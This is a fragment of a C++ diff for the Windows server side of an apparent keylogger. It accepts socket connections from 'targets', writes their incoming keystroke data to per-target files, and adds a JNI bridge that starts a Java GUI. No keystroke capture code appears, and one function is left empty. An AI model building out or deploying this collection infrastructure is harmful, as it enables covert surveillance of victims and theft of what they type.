@@ -1,16 +1,25 @@
 #include <winsock2.h>
 #include <mswsock.h>
 #include "ServerInterProcess.h"
+#include "keyloggerinterface.h"
 #include <stdio.h>
+#include <stdlib.h>
 #include <thread>
 #include <mutex>
 #include <fcntl.h>
 #include <io.h>
-
+#include <jni.h>
 HANDLE mu;
 SOCKETLIST *head;
+jobjectArray JNICALL Java_keyloggerinterface_KeyLoggerInterface_buffer
+  (JNIEnv *, jclass)
+  {
+
+    
+  }
 void Listener()
 {
+
     WSADATA WSA;
     SOCKET Listener;
     SOCKADDR_IN server, target;
@@ -110,6 +119,7 @@ void Listener()
     }
 
 }
+
 void Handler()
 {
         unsigned int rcv;
@@ -135,13 +145,13 @@ void Handler()
                         WriteFile(link->FileDescriptor,"\n</KeyLoggerMetaData>\n",
                                   strlen("\n</KeyLoggerMetaData>\n"),NULL,NULL);
                         SetFilePointer(link->FileDescriptor,((-1)*strlen("\n</KeyLoggerMetaData>\n")),NULL,FILE_CURRENT);
-
                 }
                 if (WSAGetLastError() == WSAEWOULDBLOCK)
                 {
                     Sleep(1);
                     WSASetLastError(0x00);
                     link = (link->nextTarget);
+                    Sleep(1); //give up a millisecond to stop heavy disk right from crashing the program
                 }
                 else
                 {
@@ -172,6 +182,23 @@ void Handler()
 */
 int main()
 {
+
+    JavaVM* jvm = NULL;
+    JNIEnv* env = NULL;
+    JavaVMInitArgs args;
+    JavaVMOption *option = new JavaVMOption[1];
+    option[0].optionString= const_cast<char*>("-Djava.class.path=C:\\Users\\Qu3b411\\Documents\\NetBeansProjects\\KeyLoggerInterface\\build\\classes;"),NULL;
+    args.version = JNI_VERSION_1_8;
+    args.nOptions = 1;
+    args.options = option;
+    args.ignoreUnrecognized = false;
+    jint k = JNI_CreateJavaVM(&jvm,reinterpret_cast<void**>(&env),&args);
+    jclass cls = env->FindClass("keyloggerinterface/KeyLoggerInterface");
+    jmethodID Init = env->GetMethodID(cls,"<init>","()V");
+    jobject obj = env->NewObject(cls,Init);
+    jmethodID Init_Gui = env->GetMethodID(cls,"Gui","()V");
+    env->CallVoidMethod(obj,Init_Gui);
+    delete option;
 
     mu = CreateMutex(NULL,false,NULL);
 
